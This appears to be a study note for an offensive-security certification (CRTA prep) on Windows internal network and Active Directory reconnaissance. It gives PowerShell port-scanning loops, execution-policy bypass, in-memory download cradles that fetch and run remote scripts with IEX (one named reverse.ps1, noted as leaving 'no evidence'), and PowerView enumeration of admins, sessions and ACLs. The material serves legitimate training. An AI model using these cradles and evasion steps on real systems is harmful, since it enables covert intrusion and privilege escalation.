# Internal Network Enumeration

    • Tools like nmap, netcat or built-in utilities like PowerShell can also be used
    for enumeration purposes.
    • Below is the command for scanning open TCP ports from a PowerShell
    Query.
   ``` powershell
   1..1024 | % {echo ( (new—object Net.Sockets.TcpClient).Connect("10.0.0.100", $_)) "Port $_ is open!" } 2>$null

   OR 

   442..443 | % { Test-NetConnection "google.com" -Port $_ -InformationLevel Quiet }


    # Below command will scan IP addresses 10.1.1.1-5 and some specific common TCP ports.

   1..20 | % { $a = $_; write-host "-----" write-host "10.0.0.$a"; 22,53,80,445 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.1.1.$a",$_)) "Port $ _ is open!"} 2>$null}

    # source -> https://www.sans.org/blog/sans-pen-test-cheat-sheet-powershell
   ```

# Internal Network & Active Directory Enumeration (CRTA Prep)

Internal network and Active Directory (AD) reconnaissance focuses on establishing situational awareness after gaining an initial foothold. Built-in Windows utilities and specialized PowerShell offensive toolsets allow operators to map services, accounts, trust boundaries, and administrative relationships across the domain.

---

## Native PowerShell Port Scanning & Host Discovery

When third-party utilities (`nmap`, `netcat`, `masscan`) cannot be dropped onto disk due to endpoint monitoring or restrictions, native .NET classes via PowerShell enable basic TCP connect scanning.

### 1. TCP Connect Port Sweep (Single Target)

Using the .NET `[System.Net.Sockets.TcpClient]` class:

```powershell
# Scan TCP ports 1 to 1024 on a single target IP
1..1024 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $asyncResult = $client.BeginConnect("10.0.0.100", $port, $null, $null)
        if ($asyncResult.AsyncWaitHandle.WaitOne(100, $false) -and $client.Connected) {
            Write-Host "[+] Port $port is OPEN" -ForegroundColor Green
            $client.EndConnect($asyncResult)
        }
    } catch {} finally {
        $client.Close()
    }
}

```

### 2. Fast Built-in Check (`Test-NetConnection`)

Available on Windows PowerShell 5.1+:

```powershell
# Test specific ports quietly (returns True/False)
442..445 | ForEach-Object {
    [PSCustomObject]@{
        Port   = $_
        IsOpen = (Test-NetConnection -ComputerName "10.0.0.100" -Port $_ -InformationLevel Quiet -WarningAction SilentlyContinue)
    }
}

```

### 3. Multi-Host Subnet Sweep

```powershell
# Sweep common infrastructure ports across an IP range
$ports = 22, 53, 80, 88, 389, 445, 3389, 5985
1..20 | ForEach-Object {
    $ip = "10.10.10.$_"
    Write-Host "--- Scanning $ip ---" -ForegroundColor Cyan
    foreach ($p in $ports) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        try {
            $iar = $tcp.BeginConnect($ip, $p, $null, $null)
            if ($iar.AsyncWaitHandle.WaitOne(100, $false) -and $tcp.Connected) {
                Write-Host "  [+] Port $p is open on $ip" -ForegroundColor Green
                $tcp.EndConnect($iar)
            }
        } catch {} finally {
            $tcp.Close()
        }
    }
}

```

---

## Active Directory Essentials & Execution Context

### Scope Architecture Reference

* **`10.10.10.2`** — Domain Controller (`DC01`)
* **`10.10.10.3`** — Application / Database Server (`APPSRV01`)
* **`10.10.10.4`** — Initial Access / Workstation (`WS01`)

### PowerShell Execution Policy & Loading

PowerShell Execution Policy is a safety guardrail, **not a security boundary**. It does not restrict running code in memory.

```cmd
# Launch a PowerShell session with execution policy bypassed
powershell.exe -ExecutionPolicy Bypass -NoLogo

```

#### Module Loading Mechanisms

* **Dot-Sourcing:** Loads functions directly into the current scope/session memory without compiling a persistent module.
```powershell
. .\PowerView.ps1

```


* **Module Import:** Standard PowerShell module loading (requires `.psm1` or `.psd1` structure).
```powershell
Import-Module .\PowerView.psd1 -Force

```



---

## In-Memory Download Cradles

Download cradles retrieve scripts over the network and pipe them directly into `Invoke-Expression` (`IEX`) or `[ScriptBlock]::Create()`, avoiding writing files to disk (evading static signature detection on storage).

### Common Cradle Variants

| Method | Syntax | Technical Mechanics |
| --- | --- | --- |
| **`Net.WebClient`** | `IEX (New-Object Net.WebClient).DownloadString('[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)')` | Standard .NET web client; performs synchronous in-memory string retrieval. |
| **`Invoke-WebRequest`** | `IEX (iwr '[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)' -UseBasicParsing).Content` | Modern PS built-in cmdlet; `-UseBasicParsing` prevents DOM engine initialization on servers. |
| **`System.Net.WebRequest`** | `$req = [System.Net.WebRequest]::Create('[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)'); IEX (New-Object IO.StreamReader($req.GetResponse().GetResponseStream())).ReadToEnd()` | Low-level .NET Stream reader; evades basic string detections targeting standard cmdlet names. |
| **`Msxml2.XMLHTTP` (COM)** | `$h = New-Object -ComObject Msxml2.ServerXMLHTTP.6.0; $h.open('GET', '[http://192.168.2.2/script.ps1](http://192.168.2.2/script.ps1)', $false); $h.send(); IEX $h.responseText` | Uses COM interface via unmanaged components to perform out-of-band HTTP retrieval. |

---

## Active Directory Enumeration with PowerView

PowerView (developed by Will Schroeder / harmj0y) leverages ADSI (Active Directory Service Interfaces) and .NET directory searchers to query LDAP and Active Directory without requiring the official `ActiveDirectory` PowerShell module or RSAT tools.

### 1. Domain & Forest Reconnaissance

```powershell
# Get details about the current domain (Forest root, Domain Mode, PDC)
Get-NetDomain

# Query a foreign/trusted domain specifically
Get-NetDomain -Domain labs.corp

# Get Domain Controller instances for the current domain
Get-NetDomainController

# Retrieve the Domain Security Identifier (SID)
Get-DomainSID

# Enumerate all domains within the active Active Directory Forest
Get-NetForestDomain -Verbose
Get-NetForest -Verbose

```

### 2. User & Identity Mapping

```powershell
# Native comparison (legacy Windows commands)
net user /domain

# Enumerate all domain users with PowerView
Get-NetUser

# Enumerate specific user details and attributes (e.g., description, logonCount, badPwdCount)
Get-NetUser -UserName "emp1" | Select-Object samaccountname, description, memberof, pwdlastset

# Filter users with custom attributes (e.g., finding service accounts with SPNs)
Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname

```

### 3. Computer & Asset Discovery

```powershell
# List all computer objects in the domain
Get-NetComputer

# Retrieve detailed operating system and service pack information
Get-NetComputer -FullData | Select-Object name, operatingsystem, operatingsystemversion, dnshostname

```

### 4. Group & Membership Enumeration

```powershell
# Enumerate all Domain Groups
Get-NetGroup

# List members of high-value administrative groups
Get-NetGroupMember -Identity "Domain Admins"
Get-NetGroupMember -Identity "Enterprise Admins"

# Enumerate users in nested groups
Get-NetGroupMember -Identity "Administrators" -Recurse

```

### 5. High-Value Actionable Checks

* **Local Administrator Hunting:** Scans reachable domain machines to identify where the current user context holds local administrative rights (queries the local `Remote Procedure Call (RPC)` / `OpenSCManagerW` interface).
```powershell
Find-LocalAdminAccess -Verbose

```


* **Active Session Enumeration:** Identifies where specific privileged users (e.g., Domain Admins) are logged on across domain systems (`NetSessionEnum` / `NetWkstaUserEnum` APIs).
```powershell
Get-NetSession -ComputerName DC01

```


* **Access Control List (ACL) Scanning:** Scans for discretionary access control lists (DACLs) granting dangerous permissions (`GenericAll`, `WriteDacl`, `WriteOwner`, `GenericWrite`) over domain objects.
```powershell
Invoke-ACLScanner -ResolveGUIDs -Verbose

```

## AD Essentials 
    • In the local environment we have 3 machines setup in a domain environment. One can use Windows PowerShell, Windows native executable for the enumeration and exploitation purposes.
    • In-scope IP address range .
    10.10.10.2      Domain Controller
    10.10.10.3      Application Server
    10.10.10.4      Employee System
   
   
## Windows Powershell
    • Windows PowerShell
    • It is a .NET interpreter which comes installed by-default on all Windows versions.
    • One can execute binaries and scripts completely in-memory using PowerShell.
    • Through PowerShell one can administer a network and provides access to
    manage Active Directory environment.

    • Useful for Lateral Movement scenarios
        • PowerShell Remoting
        •Web-Based PowerShell Remoting
    • In powershell everything is a object

## Invoking a PowerShell Module
    • Scripts with extension "*.ps1", "*.psm1", "*.psd1" etc can be invoked in a specific PowerShell session as follows :
``` powershell
    Import-Module <ModuIe_Name.ps1>
```
    • However a PowerShell script can be invoked in a unique way called "dot sourcing a
    script"
``` powershell
    .\<Script_Name>.ps1
```    
PowerShell in-memory Download and Execute cradle :
``` powershell
    iex (iwr 'http://192.168.2.2/file.ps11)

    $down = [System.NET.WebRequest]::Create("http://192.168.2.2/file.ps1")
        $read = $down.GetResponse()
    IEX ([System.IO.StreamReader]($read.GetResponseStream())).ReadToEnd()

    $file=New-Object -ComObject
    Msxm12.XMLHTTP;$file.openCGET','http://192.168.2.2/file.psl',$false);$file.sen
    d();iex$file.responseText

    iex (New-Object Net.WebClient).DownloadString('https://192.168.2.2/reverse.ps1')
    # DownloadString fxn will download the script directly into the memmory not in the hard disk so no evidence.

    # if you are running a powershell script in a new machine and it shows error - running scripts are disabled on this system then run the following command
    powershell -ep bypass
    
```
## Recon in the Internal Network
    • We already have access to the internal environment.
    • Credentials of a user is found on the Web-Server, which gave us access to the Employee-Machine.
    • In-built functionalities like PowerShell and WMI can be used for situational
    awareness in the network.
    • Adversary always heads for the direction of placement or setup of critical asset of a
    company.

    • We will use PowerView for enumeration.
    • Get current domain 
        [Get-NetDomain]
        [Get-NetDomain -Domain cyberwarfare.corp]

    • Retrieve Current SID and Domain Controller
        [Get-NetDomainController -Domain cyberwarfare.corp]
        Get-DomainSID


## Powerview commands

``` powershell

    .\PowerView_dev.ps1
    # if a script shows no error that means nothing was output of the script and it has been loaded in the memmory in your current powershell session.

    # List of current users
        net user 
        net user /domain 
        Get-NetUser
        Get-NetUser | Select-Object givenname
        Get-NetUser -UserName emp1

    # get current domain
        Get-NetDomain

    # Retrieve a list of users in a current domain
        Get-NetUser 
        Get-NetUser-UserName emp1

    # get info about DC
        Get-DomainController
        Get-DomainSID
        Get-DomainSID -Domain labs.corp -Verbose

    # get list of computers in the domain
        Get-NetComputer 
        Get-NetComputer -FullData
        Get-NetComputer -Verbose

    # get list of all groups in the domain
        Get-NetGroup 
        Get-NetGroupMember -Identity "Domain Admin"

    # Enumerate all domain in a forest
        Get-NetForestDomain -Verbose
        Get-NetForest -Verbose

    # find computer sessions where current user has local admin access
        Find-LocalAdminAccess -Verbose

    # XTRAS
        Invoke-ACLScanner -ResolveGUIDS -Verbose
        
    
    # This commands are not any default cmdlet but a cmdlet/command in that script that has been loaded.

```